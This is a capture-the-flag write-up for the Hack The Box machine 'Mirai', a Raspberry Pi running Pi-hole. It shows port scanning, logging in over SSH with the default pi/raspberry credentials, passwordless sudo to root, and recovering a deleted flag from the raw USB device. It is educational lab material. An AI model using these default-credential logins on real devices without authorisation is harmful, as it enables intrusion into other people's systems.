---
title: Mirai
summary: Hack The Box Linux machine running Pi-hole on a Raspberry Pi, owned with the default pi/raspberry SSH creds and a passwordless sudo, then the root flag is carved back out of a wiped USB stick.
date: 2026-10-21
tags: [Hack The Box, Pi-hole, Raspberry Pi, Default Credentials, Forensics]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Mirai
---

# CTF Room: Mirai
- [Link to machine](https://app.hackthebox.com/machines/Mirai)
- **Difficulty:** Easy
- **Category:** Default Credentials
- **OS:** Linux

## 1. Brief
Mirai is a Raspberry Pi running Pi-hole, and it falls to the oldest trick there is: the Pi's default login was never changed. Once I spot that it is a Pi, `pi` / `raspberry` over SSH gets me in, and `pi` has full passwordless sudo. The only twist is the root flag, which has been deleted off a USB stick and has to be recovered from the raw device.

---

## 2. Recon

### NMAP Scan
Full port sweep first, then version and script detection on what comes back.

```bash
nmap machine_ip -p- --min-rate 10000
nmap machine_ip -sVC -p22,53,80,1877,32400,32469
```
```text
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
1877/tcp  open  upnp    Platinum UPnP 1.0.5.13
32400/tcp open  http    Plex Media Server httpd
32469/tcp open  upnp    Platinum UPnP 1.0.5.13
```

SSH, DNS, a web server, Plex, and some UPnP. The DNS (`dnsmasq`) plus a lightweight web stack already smells like a home appliance rather than a server.

### Website - TCP 80
The site loads blank, so I checked the response headers to see what was serving it.

```bash
curl -I http://machine_ip
```
```text
HTTP/1.1 404 Not Found
X-Pi-hole: A black hole for Internet advertisements.
Server: lighttpd/1.4.35
```

`X-Pi-hole` is the giveaway. This is a [Pi-hole](https://pi-hole.net/), the DNS ad-blocker that almost always runs on a Raspberry Pi. That is the single most important fact on the box, and it is sitting in a header.

### Plex - TCP 32400
Plex on 32400 is a loud-looking service, so I had a poke. I can register an account but there are no guessable creds and nothing exploitable on this version. Dead end, as expected.

### Directory Brute Force
A quick content scan to confirm the Pi-hole admin panel, which the docs say lives at `/admin`.

```bash
feroxbuster -u http://machine_ip
```
```text
301  http://machine_ip/admin => http://machine_ip/admin/
200  http://machine_ip/versions
```

`/admin` is the Pi-hole dashboard. There is nothing to brute here, Pi-hole has no default web password, but I did not need one.

### DNS - TCP 53
With DNS open I tried a zone transfer, guessing at the obvious names.

```bash
dig axfr @machine_ip mirai.htb
```
```text
; Transfer failed.
```

Nothing. Another rabbit hole ruled out, and it points me back at the one thing that matters: this is a Raspberry Pi.

---

## 3. Foothold - Default Raspberry Pi Credentials

Every Raspberry Pi ships with the same login, `pi` / `raspberry`, and a huge number of them never get changed. That careless default is literally the point of the Mirai malware this box is named after. SSH is open, so I just tried it.

```bash
ssh pi@machine_ip
```
```text
pi@machine_ip's password: raspberry
pi@raspberrypi:~ $
```

Straight in. The user flag is on the desktop.

```bash
cat ~/Desktop/user.txt
```
```text
||ff837707************************||
```

---

## 4. Privilege Escalation - Passwordless sudo

First thing on any shell, check sudo rights.

```bash
sudo -l
```
```text
User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

`pi` can run anything as root with no password. That is the whole privilege escalation.

```bash
sudo su -
```
```text
root@raspberrypi:~#
```

---

## 5. Recovering the Root Flag

Root was not going to make it that easy. `root.txt` is a note, not a flag.

```bash
cat /root/root.txt
```
```text
I lost my original root.txt! I think I may have a backup on my USB stick...
```

So I looked at the mounted drives to find the USB stick.

```bash
mount | grep usb
```
```text
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime)
```

The raw device is `/dev/sdb`, mounted at `/media/usbstick`. The only file left there is a `damnit.txt` admitting the flag was deleted off the stick.

Here is the useful bit of filesystem trivia: deleting a file only removes its directory entry and metadata, it does not scrub the bytes off the disk. The flag's contents are almost certainly still sitting in the raw blocks of `/dev/sdb`, just no longer pointed to by a filename. Since I am root, I can read the raw device directly and grep it for a 32-character hex string, which is what an HTB flag looks like.

```bash
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
```
```text
||3d3e483143ff12ec****************||
```

There it is, carved straight out of the free space. `strings /dev/sdb -n 32` works just as well if you prefer.

---

## 6. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||ff837707************************||` |
| Root flag | `||3d3e483143ff12ec****************||` |

---

## 7. Summary
Mirai is a lesson in not shipping defaults, dressed up with a small forensics puzzle at the end.

- **The header was the box.** `X-Pi-hole` told me this was a Raspberry Pi, and a Pi means the `pi` / `raspberry` default login is worth a shot. It worked over SSH.
- **Default sudo too.** `pi` had `NOPASSWD: ALL`, so `sudo su -` was the entire privilege escalation.
- **Deleted is not gone.** The root flag had been removed from a USB stick, but the bytes were still on the raw `/dev/sdb` device, so `grep` over the device pulled it back.
- Plex and the DNS zone transfer are both deliberate distractions, worth a glance and nothing more.

**Tools used:** `nmap`, `curl`, `feroxbuster`, `dig`, `ssh`, `grep`.
